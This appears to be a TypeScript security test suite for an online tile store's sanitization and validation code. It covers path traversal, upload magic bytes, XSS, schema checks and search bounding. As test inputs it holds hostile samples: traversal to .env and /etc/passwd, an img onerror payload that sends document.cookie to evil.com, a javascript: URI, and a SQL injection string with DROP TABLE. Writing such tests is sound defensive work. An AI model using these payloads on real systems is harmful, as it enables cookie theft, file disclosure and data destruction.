/**
 * Intrihub Input Validation & Sanitization Security Audit Suite
 * Tests Path Traversal, Unsafe Uploads, Magic Bytes, Script Injection (XSS),
 * Query Parameter Bounding, and Strict Schema Enforcement.
 */

import {
  sanitizeHtml,
  sanitizeString,
  sanitizeFilename,
  isValidSafeFilename,
  sanitizeSearchTerm,
  parseBoundedInt,
} from "../lib/sanitization";
import {
  addressInputSchema,
  reviewInputSchema,
  aiGenerateInputSchema,
  verifyFileMagicBytes,
  ALLOWED_EXTENSIONS,
} from "../lib/validations/schemas";
import { GET as getUploadHandler } from "../app/api/uploads/[filename]/route";
import { NextRequest } from "next/server";

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✅ PASS: ${testName}`);
  } else {
    failedTests++;
    console.error(`  ❌ FAIL: ${testName}`);
    if (detail) console.error(`     Detail: ${detail}`);
  }
}

async function runTests() {
  console.log("================================================================");
  console.log("🛡️ INTRIHUB INPUT VALIDATION & SANITIZATION AUDIT");
  console.log("================================================================\n");

  // =========================================================================
  // 1. PATH TRAVERSAL MITIGATION & SAFE FILENAME VALIDATION
  // =========================================================================
  console.log("--- 1. PATH TRAVERSAL MITIGATION & FILENAME VALIDATION ---");

  // Traversal attack strings
  assert(!isValidSafeFilename("../../package.json"), "Rejects standard unix directory traversal (../../)");
  assert(!isValidSafeFilename("..\\..\\windows\\win.ini"), "Rejects windows backslash traversal (..\\)");
  assert(!isValidSafeFilename("../../.env"), "Rejects traversal to root .env");
  assert(!isValidSafeFilename("product%2e%2e%2fsecret.txt"), "Rejects URL-encoded traversal (%2e%2e)");
  assert(!isValidSafeFilename("image.png\0.php"), "Rejects null-byte poisoning (\0)");
  assert(!isValidSafeFilename("/etc/passwd"), "Rejects absolute unix path (/etc/passwd)");
  assert(!isValidSafeFilename("C:\\boot.ini"), "Rejects absolute windows path");
  assert(isValidSafeFilename("product-tiles-123.webp"), "Accepts valid alphanumeric filename with extension");
  assert(isValidSafeFilename("user_avatar_2026.jpg"), "Accepts valid underscore filename");

  // Verify /api/uploads/[filename] rejects traversal with HTTP 400
  const traversalReq = new NextRequest("http://localhost:3000/api/uploads/..%2F..%2Fpackage.json");
  const traversalRes = await getUploadHandler(traversalReq, {
    params: Promise.resolve({ filename: "../../package.json" }),
  });
  assert(traversalRes.status === 400, "Upload media route returns 400 Bad Request on traversal attempt");
  const traversalJson = await traversalRes.json();
  assert(
    traversalJson.error?.includes("traversal"),
    "Upload media route returns explicit traversal security error message"
  );

  // =========================================================================
  // 2. UNSAFE FILE UPLOADS & BINARY MAGIC BYTES INSPECTION
  // =========================================================================
  console.log("\n--- 2. UNSAFE FILE UPLOADS & MAGIC BYTES VERIFICATION ---");

  // Magic bytes tests
  const fakeDisguisedPayload = Buffer.from('DISGUISED_NON_IMAGE_TEXT_CONTENT_WITH_FAKE_EXTENSION');
  assert(!verifyFileMagicBytes(fakeDisguisedPayload).valid, "Rejects plain text/script disguised with fake extension");

  const invalidHeaderBytes = Buffer.from([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);
  assert(!verifyFileMagicBytes(invalidHeaderBytes).valid, "Rejects random invalid binary header bytes");

  const validJpegHeader = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
  assert(verifyFileMagicBytes(validJpegHeader).valid, "Validates authentic JPEG binary signature");

  const validPngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  assert(verifyFileMagicBytes(validPngHeader).valid, "Validates authentic PNG binary signature");

  const validPdfHeader = Buffer.from("%PDF-1.4 header bytes test content");
  assert(verifyFileMagicBytes(validPdfHeader).valid, "Validates authentic PDF binary signature");

  assert(!ALLOWED_EXTENSIONS.has(".svg"), "SVG is strictly excluded from ALLOWED_EXTENSIONS");
  assert(!ALLOWED_EXTENSIONS.has(".xml"), "XML is strictly excluded from ALLOWED_EXTENSIONS");
  assert(!ALLOWED_EXTENSIONS.has(".html"), "HTML is strictly excluded from ALLOWED_EXTENSIONS");
  assert(!ALLOWED_EXTENSIONS.has(".php"), "PHP is strictly excluded from ALLOWED_EXTENSIONS");
  assert(!ALLOWED_EXTENSIONS.has(".exe"), "EXE is strictly excluded from ALLOWED_EXTENSIONS");

  // =========================================================================
  // 3. SCRIPT INJECTION (XSS) SANITIZATION
  // =========================================================================
  console.log("\n--- 3. SCRIPT INJECTION (XSS) SANITIZATION ---");

  const rawScriptTag = '<script>alert("XSS Attack")</script>Great product!';
  const cleanScriptTag = sanitizeHtml(rawScriptTag);
  assert(!cleanScriptTag.includes("<script>"), "Strips opening <script> tag");
  assert(!cleanScriptTag.includes("</script>"), "Strips closing </script> tag");
  assert(cleanScriptTag.includes("Great product!"), "Preserves legitimate text content");

  const rawImgPayload = '<img src="x" onerror="fetch(\'http://evil.com/steal?\'+document.cookie)">';
  const cleanImgPayload = sanitizeHtml(rawImgPayload);
  assert(!cleanImgPayload.includes("onerror"), "Neutralizes inline onerror event handler");

  const rawJsProtocol = '<a href="javascript:alert(1)">Click me</a>';
  const cleanJsProtocol = sanitizeHtml(rawJsProtocol);
  assert(!cleanJsProtocol.includes("javascript:"), "Neutralizes dangerous javascript: URI scheme");

  const iframePayload = '<iframe src="http://malicious-site.ru"></iframe>Review details';
  const cleanIframe = sanitizeHtml(iframePayload);
  assert(!cleanIframe.includes("<iframe"), "Strips <iframe> element entirely");

  // Control characters & null bytes
  const nullByteString = "Bengaluru\x00 City\x07 Area";
  const cleanNullBytes = sanitizeString(nullByteString);
  assert(!cleanNullBytes.includes("\x00") && !cleanNullBytes.includes("\x07"), "Strips null bytes and ASCII control characters");

  // =========================================================================
  // 4. STRICT ZOD SCHEMA VALIDATION
  // =========================================================================
  console.log("\n--- 4. STRICT ZOD SCHEMA VALIDATION ---");

  // Address Schema
  const validAddress = {
    street: "123 MG Road, Brigade Junction",
    city: "Bengaluru",
    state: "Karnataka",
    pincode: "560001",
    phone: "+91 9876543210",
  };
  const parsedAddress = addressInputSchema.safeParse(validAddress);
  assert(parsedAddress.success, "Valid Indian address passes addressInputSchema");

  const invalidPincodeAddress = {
    street: "123 MG Road",
    pincode: "012345", // Invalid Indian pincode (cannot start with 0)
  };
  const invalidPincodeRes = addressInputSchema.safeParse(invalidPincodeAddress);
  assert(!invalidPincodeRes.success, "Rejects address with invalid postal pincode (starts with 0)");

  const invalidPhoneAddress = {
    street: "123 MG Road",
    phone: "12345", // Invalid phone length
  };
  const invalidPhoneRes = addressInputSchema.safeParse(invalidPhoneAddress);
  assert(!invalidPhoneRes.success, "Rejects address with invalid phone number");

  const xssAddress = {
    street: '123 Main St <script>alert("XSS")</script>',
    city: "Bengaluru",
    pincode: "560001",
  };
  const parsedXssAddress = addressInputSchema.safeParse(xssAddress);
  assert(
    parsedXssAddress.success && !parsedXssAddress.data.street.includes("<script>"),
    "Address schema automatically sanitizes script injection in street field"
  );

  // Review Schema
  const validReview = {
    productId: "prod-tile-001",
    orderId: "ord-10029",
    rating: 5,
    title: "Excellent Glazed Vitrified Tiles",
    body: "Looks stunning in our master bathroom.",
  };
  assert(reviewInputSchema.safeParse(validReview).success, "Valid customer review passes reviewInputSchema");

  const invalidRatingReview = {
    productId: "prod-tile-001",
    orderId: "ord-10029",
    rating: 6, // Rating must be 1-5
  };
  assert(!reviewInputSchema.safeParse(invalidRatingReview).success, "Rejects review with rating > 5");

  const floatRatingReview = {
    productId: "prod-tile-001",
    orderId: "ord-10029",
    rating: 3.5, // Rating must be integer
  };
  assert(!reviewInputSchema.safeParse(floatRatingReview).success, "Rejects non-integer review rating");

  // AI Prompt Schema
  const validAiPrompt = {
    prompt: "Modern Italian marble finish tiles for living room",
    roomType: "living",
    style: "contemporary",
  };
  assert(aiGenerateInputSchema.safeParse(validAiPrompt).success, "Valid AI prompt passes aiGenerateInputSchema");

  const tooShortPrompt = { prompt: "hi" };
  assert(!aiGenerateInputSchema.safeParse(tooShortPrompt).success, "Rejects AI prompt under 5 characters");

  const oversizedPrompt = { prompt: "a".repeat(1005) };
  assert(!aiGenerateInputSchema.safeParse(oversizedPrompt).success, "Rejects AI prompt exceeding 1000 characters");

  // =========================================================================
  // 5. QUERY PARAMETER BOUNDING & SEARCH RE-DOS MITIGATION
  // =========================================================================
  console.log("\n--- 5. QUERY PARAMETER BOUNDING & SEARCH SANITIZATION ---");

  // parseBoundedInt
  assert(parseBoundedInt("-10", 1, 100, 1) === 1, "Clamps negative integer to min boundary");
  assert(parseBoundedInt("999999", 1, 50, 12) === 50, "Clamps oversized limit to max boundary (50)");
  assert(parseBoundedInt("not-a-number", 1, 100, 10) === 10, "Falls back to default on non-numeric input");
  assert(parseBoundedInt(undefined, 1, 100, 10) === 10, "Falls back to default on undefined input");

  // sanitizeSearchTerm
  const oversizedSearch = "marble tiles ".repeat(50); // 650 chars, 100 words
  const cleanSearch = sanitizeSearchTerm(oversizedSearch, 80, 8);
  assert(cleanSearch.length <= 80, "Clamps massive search query to maximum character length (80)");
  assert(cleanSearch.split(" ").length <= 8, "Limits search query to maximum word count (8 terms)");

  const sqlMetacharacters = "vitrified' OR '1'='1; DROP TABLE products; --";
  const cleanSqlSearch = sanitizeSearchTerm(sqlMetacharacters);
  assert(!cleanSqlSearch.includes(";") && !cleanSqlSearch.includes("--"), "Strips SQL command separators (;) and comments (--) from search input");

  // =========================================================================
  // SUMMARY
  // =========================================================================
  console.log("\n================================================================");
  console.log(`TOTAL INPUT VALIDATION TESTS: ${totalTests}`);
  console.log(`PASSED: ${passedTests}`);
  console.log(`FAILED: ${failedTests}`);
  console.log("================================================================\n");

  if (failedTests > 0) {
    process.exit(1);
  }
}

runTests().catch((err) => {
  console.error("Test execution fatal error:", err);
  process.exit(1);
});
